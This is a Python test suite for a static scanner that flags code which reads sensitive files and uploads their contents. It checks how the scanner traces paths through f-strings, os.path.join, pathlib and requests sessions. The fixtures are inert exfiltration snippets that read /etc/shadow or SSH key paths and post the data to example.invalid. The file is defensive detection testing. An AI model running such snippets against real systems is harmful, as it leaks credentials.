"""Broader inert-source cases for tracing, uncertainty and patch integration."""
import contextlib
import io
import json
from pathlib import Path
import tempfile
import unittest

import falcon_check as scanner
import falcon_gui as gui
import falcon_remediate as fixes


SINK = 'requests.post("https://example.invalid/upload", data=secret)\n'
READ = 'secret = open("/etc/shadow").read()\n'


def inspect(source):
    return scanner.analyze_bytes(source.encode(), 'fixture.py', 'python')


class TracingTests(unittest.TestCase):
    def uploads(self, source):
        report = inspect(source)
        self.assertIn(report['status'], ('NEEDS REVIEW', 'NO INDICATORS FOUND'), report)
        return fixes.upload_findings(report)

    def test_fstrings_trace_known_strings_and_destination(self):
        source = 'import requests\nuser = "demo"\np = f"/home/{user}/.ssh/id_example"\nsecret = open(p).read()\nhost = "example.invalid"\nrequests.post(f"https://{host}/upload", data=secret)'
        item, = self.uploads(source)
        self.assertEqual(item['resolved'], '/home/demo/.ssh/id_example')
        self.assertEqual(item['destination'], 'https://example.invalid/upload')
        self.assertTrue(any('f-string' in step for step in item['trace']))

    def test_fstring_unknown_or_formatted_object_is_not_evaluated(self):
        for value in ('input()', 'unknown()', '123'):
            with self.subTest(value=value):
                source = 'import requests\nx = ' + value + '\np = f"/home/{x}/.ssh/id_example"\nsecret = open(p).read()\n' + SINK
                self.assertEqual(self.uploads(source), [])

    def test_fstring_format_specification_is_not_expanded(self):
        source = 'import requests\nx = "demo"\np = f"/home/{x:1000000000}/.ssh/id_example"\nsecret = open(p).read()\n' + SINK
        self.assertEqual(self.uploads(source), [])

    def test_fstring_literal_conversions(self):
        for conversion in ('', '!s', '!r', '!a'):
            source = 'import requests\nx = "shadow"\np = f"/etc/{x' + conversion + '}"\nsecret = open(p).read()\n' + SINK
            # repr/ascii retain quotes; '/etc/\'shadow\'' is not /etc/shadow.
            self.assertEqual(len(self.uploads(source)), 1 if conversion in ('', '!s') else 0)

    def test_os_join_import_aliases(self):
        for imports, call in (('import os', 'os.path.join'), ('from os.path import join as build', 'build'), ('from os import path as p', 'p.join'), ('import posixpath as p', 'p.join')):
            with self.subTest(imports=imports):
                source = 'import requests\n' + imports + '\nfolder = "/etc"\np = ' + call + '(folder, "shadow")\nsecret = open(p).read()\n' + SINK
                item, = self.uploads(source)
                self.assertEqual(item['resolved'], '/etc/shadow')
                self.assertTrue(any('joins known path' in step for step in item['trace']))

    def test_absolute_component_discards_earlier_sensitive_path(self):
        for expression in ('os.path.join("/etc/shadow", "/tmp/notes")', 'Path("/etc/shadow", "/tmp/notes")', 'Path("/etc/shadow") / "/tmp/notes"'):
            source = 'import requests\nimport os\nfrom pathlib import Path\np = ' + expression + '\nsecret = open(p).read()\n' + SINK
            self.assertEqual(self.uploads(source), [])
        report = inspect('from pathlib import Path\np = Path("/etc/shadow", "/tmp/notes")')
        self.assertEqual(report['findings'], [])

    def test_unknown_join_component_not_guessed(self):
        source = 'import requests\nimport os\np = os.path.join(base, ".ssh", "id_example")\nsecret = open(p).read()\n' + SINK
        self.assertEqual(self.uploads(source), [])

    def test_join_alias_reassignment_not_trusted(self):
        source = 'import requests\nfrom os.path import join\njoin = custom\np = join("/etc", "shadow")\nsecret = open(p).read()\n' + SINK
        self.assertEqual(self.uploads(source), [])

    def test_pathlib_components_slash_and_joinpath(self):
        for expression in ('Path("/etc", "shadow")', 'Path("/etc") / "shadow"', 'Path("/etc").joinpath("shadow")', 'Path(Path("/etc"), "shadow")'):
            with self.subTest(expression=expression):
                source = 'import requests\nfrom pathlib import Path\np = ' + expression + '\nsecret = p.read_bytes()\n' + SINK
                item, = self.uploads(source)
                self.assertEqual(item['resolved'], '/etc/shadow')

    def test_path_open_with_handle(self):
        source = 'import requests\nfrom pathlib import Path\np = Path("/etc") / "shadow"\nwith p.open("rb") as handle:\n    secret = handle.read()\n' + SINK
        self.assertEqual(len(self.uploads(source)), 1)

    def test_path_open_write_only_not_claimed(self):
        source = 'import requests\nfrom pathlib import Path\nwith Path("/etc/shadow").open("w") as handle:\n    secret = handle.read()\n' + SINK
        self.assertEqual(self.uploads(source), [])

    def test_sessions_constructed_directly_and_with_context_manager(self):
        for setup in ('s = requests.Session()\n', 's = requests.session()\n', 's = requests.sessions.Session()\n', 'with requests.Session() as s:\n    pass\n'):
            with self.subTest(setup=setup):
                item, = self.uploads('import requests\n' + setup + READ + 's.post("https://example.invalid", data=secret)')
                self.assertIn('requests.Session().post', item['inference'])

    def test_session_import_instance_and_method_aliases(self):
        source = 'from requests import Session as Client\ns = Client()\nother = s\nsend = other.post\n' + READ + 'send("https://example.invalid", secret)'
        self.assertEqual(len(self.uploads(source)), 1)

    def test_session_inline_constructor_and_payload_positions(self):
        for call in ('requests.Session().post("https://example.invalid", secret)', 'requests.Session().post("https://example.invalid", None, {"value": secret})', 'requests.Session().put("https://example.invalid", data=secret)', 'requests.Session().patch(url="https://example.invalid", files={"file": secret})'):
            with self.subTest(call=call):
                self.assertEqual(len(self.uploads('import requests\n' + READ + call)), 1)

    def test_non_session_objects_not_assumed_to_be_requests(self):
        for setup in ('s = CustomSession()', 's = requests.Session(unexpected=True)', 's = factory()', 's = requests.Session'):
            self.assertEqual(self.uploads('import requests\n' + setup + '\n' + READ + 's.post("https://example.invalid", data=secret)'), [])

    def test_session_reassignment_mutation_or_unknown_use_discards_identity(self):
        for change in ('s = other', 's.post = custom', 'unknown(s)', 'alias = s\nalias.post = custom'):
            with self.subTest(change=change):
                self.assertEqual(self.uploads('import requests\ns = requests.Session()\n' + READ + change + '\ns.post("https://example.invalid", data=secret)'), [])

    def test_relative_import_overwrites_previous_requests_binding(self):
        source = 'import requests\nfrom .local import requests\n' + READ + SINK
        self.assertEqual(self.uploads(source), [])

    def test_session_parameter_shadows_outer_session(self):
        source = 'import requests\ns = requests.Session()\ndef example(s):\n    secret = open("/etc/shadow").read()\n    s.post("https://example.invalid", data=secret)'
        self.assertEqual(self.uploads(source), [])

    def test_session_not_carried_from_mutable_global_into_function(self):
        source = 'import requests\ns = requests.Session()\ndef example():\n    secret = open("/etc/shadow").read()\n    s.post("https://example.invalid", data=secret)'
        self.assertEqual(self.uploads(source), [])

    def test_unpacked_arguments_require_manual_analysis(self):
        for call in ('requests.post(*args, data=secret)', 'requests.post("https://example.invalid", data=secret, **kwargs)'):
            self.assertEqual(self.uploads('import requests\n' + READ + call), [])

    def test_supported_session_can_make_several_calls(self):
        source = 'import requests\ns = requests.Session()\n' + READ + 's.post("https://example.invalid/one", data=secret)\ns.put("https://example.invalid/two", data=secret)'
        self.assertEqual(len(self.uploads(source)), 2)

    def test_unrelated_upload_after_sensitive_read_not_connected(self):
        source = 'import requests\ns = requests.Session()\n' + READ + 's.post("https://example.invalid", data="public status")'
        self.assertEqual(self.uploads(source), [])

    def test_documented_backup_keeps_evidence_and_legitimate_use_explanation(self):
        source = '# Authorized backup of my credentials\nimport requests\ns = requests.Session()\n' + READ + 's.post("https://backup.example.invalid", data=secret)'
        item, = self.uploads(source)
        self.assertIn('authorized backup', item['legitimate_use'].lower())
        self.assertIn('not observed', item['uncertainty'])
        self.assertIn('Scanning did not execute', item['source_fact'])
        self.assertIn('Under the supported', item['inference'])

    def test_path_and_string_value_budgets(self):
        for expression in ('os.path.join(' + ','.join(repr('part') for _ in range(33)) + ')', 'f"{prefix}{prefix}/.ssh/id_example"'):
            source = 'import os\nimport requests\nprefix = ' + repr('x' * 3000) + '\np = ' + expression + '\nsecret = open(p).read()\n' + SINK
            self.assertEqual(self.uploads(source), [])

    def test_deep_unknown_attribute_chain_stays_bounded(self):
        source = 'unknown' + '.field' * 150 + '.post("https://example.invalid", data="hello")'
        self.assertEqual(self.uploads(source), [])

    def test_source_side_effects_not_executed_by_path_resolution(self):
        with tempfile.TemporaryDirectory() as directory:
            marker = Path(directory) / 'never-created'
            source = 'import requests\nimport os\npart = open({!r}, "w").write("bad")\np = os.path.join("/home", f"{{part}}", ".ssh", "id_example")\nsecret = open(p).read()\n'.format(str(marker)) + SINK
            self.uploads(source)
            self.assertFalse(marker.exists())

    def test_both_reports_separate_source_facts_and_inference(self):
        report = scanner.analyze_bytes(scanner.DEMO_EVIDENCE, 'demo.py', 'python')
        graphical = gui.report_text(report)
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            scanner.show_report(report)
        for text in (graphical, out.getvalue()):
            for label in ('Source fact:', 'Inferred connection:', 'Possible legitimate use:', 'Suggested action:'):
                self.assertIn(label, text)

    def test_session_patch_preserves_original_and_other_findings(self):
        with tempfile.TemporaryDirectory() as directory:
            source, target = Path(directory) / 'example.txt', Path(directory) / 'reviewed.txt'
            source.write_bytes(scanner.DEMO_EVIDENCE)
            plan = fixes.prepare(source)
            self.assertIn('-        client.post(', plan.diff)
            self.assertIn('Possible legitimate use:', fixes.preview_text(plan))
            after = fixes.save_copy(plan, target)
            self.assertEqual(source.read_bytes(), scanner.DEMO_EVIDENCE)
            self.assertEqual(fixes.upload_findings(after), [])
            self.assertEqual(after['status'], 'NEEDS REVIEW')

    def test_fixture_corpus(self):
        corpus = json.loads((Path(__file__).parent / 'tracing-examples.json').read_text())
        for item in corpus:
            with self.subTest(example=item['name']):
                report = inspect('\n'.join(item['source']) + '\n')
                self.assertIn(report['status'], ('NEEDS REVIEW', 'NO INDICATORS FOUND'))
                self.assertEqual(len(fixes.upload_findings(report)), item['expected_upload_findings'])


if __name__ == '__main__':
    unittest.main()
